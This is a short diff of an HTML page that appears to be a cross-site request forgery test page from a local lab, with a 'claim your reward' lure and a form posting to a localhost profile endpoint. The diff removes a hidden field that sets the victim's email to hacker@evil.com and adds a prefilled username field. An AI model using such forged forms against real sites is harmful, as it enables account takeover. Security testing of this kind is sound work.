@@ -2,7 +2,12 @@
   <body>
     <h2>Click the button below to claim your reward!</h2>
     <form action="http://localhost:3000/profile" method="POST">
-      <input type="hidden" name="email" value="hacker@evil.com">
+       <div class="form-group">
+                                <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="width: 100%;">
+                                    <input class="form-control mdl-textfield__input" id="username" type="text" name="username" value="Alvas123" style="color: #FFFFFF;" placeholder="e.g. SuperUser" aria-label="Text field for the username">
+                                    <label class="mdl-textfield__label" for="username" style="color: #FFFFFF;">Username:</label>
+                                </div>
+                            </div>
       <input type="submit" value="Claim Reward">
     </form>
   </body>
